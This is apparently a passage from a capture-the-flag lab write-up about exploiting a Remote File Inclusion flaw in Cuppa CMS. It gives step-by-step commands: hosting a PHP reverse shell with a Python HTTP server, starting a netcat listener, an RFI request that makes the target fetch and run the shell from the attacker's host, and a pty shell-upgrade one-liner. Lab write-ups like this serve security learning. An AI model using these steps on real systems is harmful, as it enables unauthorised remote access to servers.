We now navigate to the /administrator directory and see that it is running Cuppa CMS.
We search online for any exploits related to Cuppa CMS and find one for Remote File Inclusion

https://www.exploit-db.com/exploits/25971

We copy the exploit and run it against the target while calling a reverse PHP shell script (seperate download) located on our system.!

1 - START A PYTHON HTTP SERVER IN THE SAME DIRECTORY AS SHELL.PHP TO ALLOW THE TARGET WEB SERVER TO GET THE PHP REVERSE SHELL:
python3 -m http.server 8000

2 - START A NETCAT LISTENER WITH SAME PORT AS SHELL.PHP ONE TO ALLOW THE REVERSE SHELL TO CONNECT TO TARGET:
nc -lvnp 1234

3 - MAKE THE FOLLOWING REQUEST IN THE WEB BROWSER BAR TO EXPLOIT RFI
http://10.10.116.94/45kra24zxs28v3yd/administrator/alerts/alertConfigField.php?urlConfig=http://10.10.71.50:8000/shell.php

4 - Connected as USER! Read the user flag!

python -c 'import pty;pty.spawn("/bin/bash")'	- VERY IMPORTANT - UPGRADE YOUR DUMB SHELL TO A TTY SHELL WITH PYTHON

navigated to the /admin_101/ directory and made a login request with BURP Suite Proxy active
